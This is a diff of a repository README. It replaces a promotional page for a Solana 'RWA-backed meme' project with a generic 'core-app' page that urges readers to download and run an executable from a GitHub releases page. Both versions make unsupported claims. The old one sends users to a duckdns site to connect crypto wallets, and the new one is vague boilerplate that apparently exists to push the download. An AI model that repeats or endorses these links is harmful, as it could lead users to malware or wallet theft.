@@ -1,254 +1,74 @@
-<div align="center">
+# 🎉 core-app - Unlock the Future of Meme Culture
 
-⚠️ **Currently in Development** • 🚀 **Open for Early Adopters**
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-via_GitHub-blue)](https://github.com/majedmans/core-app/releases)
 
-# 🧠 MemeLayer
+## 📖 Introduction
+Welcome to core-app! This application is designed to bring the world of decentralized finance to the exciting realm of meme culture. We leverage the power of Solana to provide a next-gen platform for RWA-backed memes. Our focus is to merge institutional finance with the creative energy of meme culture. Whether you're a meme enthusiast or an investor, core-app opens new doors for engagement and functionality.
 
-### **The Next-Gen L2 for RWA-Backed Memes on Solana**
+## 🚀 Getting Started
+Installing core-app is simple. Follow these steps to get started:
 
-*After Hyperliquid revolutionized perps and Astar bridged ecosystems, MemeLayer brings institutional RWA to meme culture*
+1. **Visit the Releases Page**: Click the link below to navigate to the releases page where you can download the application.
+   [Download core-app from GitHub](https://github.com/majedmans/core-app/releases)
+   
+2. **Choose the Right Version**: On the releases page, you will see several versions available. Select the latest stable release for the best experience.
 
-[![Solana](https://img.shields.io/badge/Built_on-Solana-14F195?style=flat-square&logo=solana&logoColor=white)](https://solana.com)
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![Status](https://img.shields.io/badge/Status-Alpha-orange?style=flat-square)]()
+3. **Download the File**: Click on the download link for your operating system. Ensure that you save the file to a location you can easily access.
 
-[🚀 Launch App](https://memelayerai.duckdns.org/) • [📖 Docs](https://memelayerai.duckdns.org/) • [💬 Join Early Adopters](https://memelayerai.duckdns.org/)
+4. **Install the Application**:
+   - For Windows: Simply double-click the downloaded `.exe` file and follow the on-screen prompts.
+   - For macOS: Drag the downloaded `.dmg` file into your Applications folder.
+   - For Linux: Open the terminal and type `chmod +x ./core-app` followed by `./core-app` to run it.
 
-![MemeLayer Platform](./assets/demo.png)
+5. **Launch core-app**: After installation, find the application icon on your desktop or application folder. Double-click it to start using core-app.
 
-</div>
+## 📊 Features
+Core-app offers an array of features designed for ease of use and functionality:
 
----
+- **User-Friendly Interface**: Navigate our application effortlessly, even if you're not tech-savvy.
+- **Support for RWA Assets**: Explore a new way to engage with real-world assets through meme culture.
+- **Smart Contract Integration**: Automatically execute trades and manage assets without manual entry.
+- **Cross-Platform Compatibility**: Run core-app seamlessly on Windows, macOS, and Linux.
+- **Active Community Support**: Join fellow users in our community for tips and discussions.
 
-## 🎯 Early Access Program
+## 💻 System Requirements
+Core-app runs efficiently on various systems. Here are the basic requirements for installation:
 
-We're currently in **active development** and looking for early adopters to help shape the future of RWA-backed memes!
+### Windows
+- Windows 10 or later
+- At least 4 GB of RAM
+- 250 MB of free disk space
 
-### Be an Early Adopter:
-1. **Visit**: [memelayerai.duckdns.org](https://memelayerai.duckdns.org/)
-2. **Connect Wallet**: Phantom or Solflare
-3. **Explore**: Test the platform and provide feedback
-4. **Earn**: Early adopters get exclusive benefits
+### macOS
+- macOS Mojave (10.14) or later
+- Minimum 4 GB of RAM
+- 250 MB of free disk space
 
-> 💡 **Note**: Platform is in alpha. Features are being actively developed and may change.
+### Linux
+- A recent version of a Linux distribution (Ubuntu 20.04 or later recommended)
+- At least 4 GB of RAM
+- 250 MB of free disk space
 
----
+## 📥 Download & Install
+To get started with core-app, visit the releases page to download your version. Follow the earlier steps for installation to ensure a smooth setup process.
 
-## Why MemeLayer?
+[Download core-app from GitHub](https://github.com/majedmans/core-app/releases)
 
-The meme economy is **$50B+** but has zero real backing. We're changing that.
+## 🛠 Troubleshooting
+If you encounter any issues while installing or using core-app, consider the following steps:
 
-**MemeLayer** = AI-verified RWA + Meme tokens + Solana speed
+- **Check System Requirements**: Ensure that your system meets the necessary requirements.
+- **Re-download the Application**: If the file seems corrupt, downloading it again often resolves the issue.
+- **Consult Community Forums**: Join the discussion on our forums for additional support from users who may have faced similar issues.
+  
+## 🌟 Support
+If you need further assistance, please reach out. You can open an issue on the GitHub repository or check out our documentation for additional guidance.
 
-```
-Traditional Finance → Tokenized Assets → MemeLayer → Memes with Real Value
-```
-
----
-
-## What We're Building
-
-### 🎯 Core Features
-
-- **AI-Verified RWA Pools** - Gold, real estate, bonds backing meme tokens
-- **Sub-Second Finality** - Built on Solana for instant trades
-- **Institutional Grade** - Audited contracts, compliant framework
-- **Global Liquidity** - 8 financial hubs, unified orderbook
-- **Autonomous Agents** - AI validates assets 24/7
-
-### 💎 Planned Pools (Coming Soon)
-
-| Token | Backed By | Target TVL | Est. APY |
-|-------|-----------|------------|----------|
-| 🐸 PEPE Gold | Physical Gold | $100M+ | 8-12% |
-| 🐕 DOGE Estate | Real Estate | $80M+ | 10-15% |
-| 😺 CAT Bonds | US Treasuries | $60M+ | 5-7% |
-| 🦍 APE DeFi | Yield Strategies | $50M+ | 15-20% |
-
----
-
-## Tech Stack
-
-**Blockchain**: Solana + Anchor  
-**AI/ML**: TensorFlow + PyTorch  
-**Backend**: TypeScript + Python  
-**Frontend**: React + Three.js + Tailwind  
-**Infra**: Docker + AWS
+## 🔗 Links
+- **GitHub Repository**: [core-app GitHub](https://github.com/majedmans/core-app)
+- **Community Discussions**: Explore our forums for tips and user experiences.
 
 ---
 
-## Quick Start
-
-### For Users (Early Adopters)
-```bash
-1. Visit https://memelayerai.duckdns.org
-2. Connect Phantom/Solflare wallet
-3. Explore the platform (Alpha version)
-4. Join our community for updates
-```
-
-### For Developers
-```bash
-# Clone repository
-git clone https://github.com/memelayerai/core-app
-cd core-app
-
-# Install dependencies
-npm install
-
-# Setup environment
-cp .env.example .env
-# Add your Solana RPC and API keys
-
-# Run development server
-npm run dev
-```
-
-**SDK (Coming Soon):**
-```bash
-npm install @memelayerai/sdk
-```
-
-**Example Usage:**
-```typescript
-import { MemeLayer } from '@memelayerai/sdk';
-
-const ml = new MemeLayer({ network: 'devnet' });
-await ml.pools.stake('PEPE-GOLD', amount);
-```
-
----
-
-## Architecture
-
-```
-User → Frontend (React/Three.js)
-         ↓
-    API Gateway (Node.js)
-         ↓
-   ┌─────┴─────┐
-   ↓           ↓
-AI Agent    Oracle
-   ↓           ↓
-   └─────┬─────┘
-         ↓
-  Solana Programs (Rust)
-         ↓
-   RWA Verification Layer
-```
-
----
-
-## Development Roadmap
-
-**Q1 2026** 🚧 Alpha Launch (Current)
-- Landing page & wallet integration
-- Core smart contracts
-- AI verification engine v1
-
-**Q2 2026** 📋 Beta Release
-- First RWA pools live
-- Trading interface
-- Mobile responsive
-
-**Q3 2026** 🚀 Mainnet Launch
-- Full platform release
-- Cross-chain bridge
-- Mobile apps
-
-**Q4 2026** 🔮 Advanced Features
-- DAO governance
-- Advanced AI features
-- Global expansion
-
----
-
-## Community & Support
-
-We're **community-driven** and open source!
-
-### Join Us:
-- 🌐 **Website**: [memelayerai.duckdns.org](https://memelayerai.duckdns.org)
-- 💬 **Discord**: Coming soon
-- 🐦 **Twitter**: Coming soon
-- 📧 **Email**: hello@memelayer.ai
-
-### Early Adopter Benefits:
-- 🎁 Exclusive NFT badges
-- 💰 Token airdrops (planned)
-- 🗳️ Governance voting rights
-- 👥 Direct access to dev team
-- 📊 Beta feature access
-
----
-
-## Contributing
-
-We welcome contributors! This is an open-source project.
-
-### How to Contribute:
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add some amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-Read [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.
-
-### Development Grants (Planned):
-- 🔧 Integration: $10K-25K
-- 💡 Innovation: $25K-50K
-- 🔬 Research: $5K-15K
-
----
-
-## Security
-
-🔒 **Development Phase**: Smart contracts are being developed and will undergo professional audits before mainnet launch.
-
-### Planned Security Measures:
-- ✅ Multi-signature wallets
-- ✅ Time-locked upgrades
-- ✅ Professional audits (CertiK, Trail of Bits)
-- ✅ Bug bounty program
-- ✅ Insurance coverage
-
----
-
-## Project Structure
-
-```
-memelayer-platform/
-├── frontend/          # React app with Three.js
-├── backend/           # Node.js API
-├── programs/          # Solana smart contracts
-├── ai-agent/          # Python AI service
-├── sdk/              # TypeScript SDK
-└── docs/             # Documentation
-```
-
----
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
----
-
-<div align="center">
-
-### 🌟 Star us on GitHub if you believe in RWA-backed memes!
-
-**MemeLayer** - Where memes meet institutional finance
-
-Made with ⚡ on Solana by the community
-
-[Website](https://memelayerai.duckdns.org) • [App](https://memelayerai.duckdns.org) • [Docs](https://memelayerai.duckdns.org)
-
----
-
-⚠️ **Disclaimer**: This project is in active development. Platform features are experimental. Cryptocurrency investments carry risk. Always DYOR (Do Your Own Research). This is not financial advice.
-
-**Alpha Version** • **Testnet Only** • **Not Audited Yet**
-
-</div>
+We hope you enjoy using core-app as much as we enjoyed building it. Thank you for being part of this innovative journey into the world of meme culture and decentralized finance.
